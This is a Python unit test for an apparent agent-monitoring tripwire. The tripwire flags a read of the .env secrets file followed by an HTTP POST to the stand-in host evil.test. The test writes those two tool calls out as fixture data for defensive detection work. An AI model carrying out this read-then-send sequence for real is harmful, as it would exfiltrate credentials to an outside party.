from __future__ import annotations

from assay_api.models import ToolCall, Tripwire
from assay_api.tripwires import evaluate


def test_sequence_tripwire_requires_prior_matching_call() -> None:
    wire = Tripwire(
        id="env-exfil",
        label="Read env then exfiltrate",
        tool_pattern=r"http_post",
        param_pattern=r"evil\.test",
        after=r"read_file:\.env",
    )

    assert (
        evaluate(
            [wire],
            [ToolCall(name="http_post", params={"url": "https://evil.test/collect"})],
        )
        == []
    )

    hits = evaluate(
        [wire],
        [
            ToolCall(name="read_file", params={"path": ".env"}),
            ToolCall(name="http_post", params={"url": "https://evil.test/collect"}),
        ],
    )

    assert len(hits) == 1
    assert hits[0].tripwire_id == "env-exfil"
    assert hits[0].call_index == 1
